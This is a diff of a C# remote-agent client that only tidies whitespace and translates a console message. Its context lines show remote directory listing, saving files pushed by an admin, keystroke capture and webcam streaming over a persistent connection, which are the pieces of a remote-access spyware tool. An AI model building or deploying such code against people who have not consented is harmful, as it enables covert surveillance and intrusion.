@@ -200,7 +200,7 @@ namespace AgentApp
                             Path = d.Name,
                             Size = d.TotalSize
                         }).ToList();
-                        
+
                         var json = JsonSerializer.Serialize(drives);
                         await _connection.InvokeAsync("SendDirectoryContentsResult", "", path, json);
                         return;
@@ -208,7 +208,7 @@ namespace AgentApp
 
                     var dirInfo = new DirectoryInfo(path);
                     var list = new System.Collections.Generic.List<object>();
-                    
+
                     try
                     {
                         foreach (var d in dirInfo.GetDirectories())
@@ -219,7 +219,7 @@ namespace AgentApp
                         {
                             list.Add(new { Type = "File", Name = f.Name, Path = f.FullName, Size = f.Length });
                         }
-                    } 
+                    }
                     catch (UnauthorizedAccessException)
                     {
                         // Bỏ qua lỗi truy cập
@@ -275,7 +275,7 @@ namespace AgentApp
                     byte[] fileBytes = Convert.FromBase64String(base64Data);
                     await File.WriteAllBytesAsync(fullPath, fileBytes);
                     Console.WriteLine($"File uploaded and saved to: {fullPath}");
-                    
+
                     // You could optionally send a confirmation back to Admin here
                 }
                 catch (Exception ex)
@@ -326,7 +326,7 @@ namespace AgentApp
                                         else if (key == ConsoleKey.Enter) keyName = "Enter";
                                         else if (key == ConsoleKey.Spacebar) keyName = "Space";
                                         else if (key == ConsoleKey.Tab) keyName = "Tab";
-                                        
+
                                         if (isShift) prefix += "Shift+";
                                         keyOutput = $"[{prefix}{keyName}]";
                                     }
@@ -476,7 +476,7 @@ namespace AgentApp
                                 if (_videoSource == null)
                                 {
                                     var device = videoDevices[0];
-                                    
+
                                     if (!string.IsNullOrEmpty(cameraMoniker))
                                     {
                                         foreach (FilterInfo d in videoDevices)
@@ -499,7 +499,7 @@ namespace AgentApp
                                             }
                                         }
                                     }
-                                    
+
                                     Console.WriteLine($"Found camera: {device.Name}");
                                     _videoSource = new VideoCaptureDevice(device.MonikerString);
                                     if (_videoSource.VideoCapabilities.Length > 0)
@@ -526,7 +526,7 @@ namespace AgentApp
                     });
                     t.SetApartmentState(ApartmentState.STA);
                     t.Start();
-                    t.Join(7000); 
+                    t.Join(7000);
                 }
                 catch (Exception ex)
                 {
@@ -610,7 +610,7 @@ namespace AgentApp
 
                             if (!_firstFrameSent)
                             {
-                                Console.WriteLine("Thành công! Frame hình ảnh đầu tiên đã được gửi đi. Camera đang stream.");
+                                Console.WriteLine("Connect successed. Camera is now streaming...");
                                 _firstFrameSent = true;
                             }
                         }
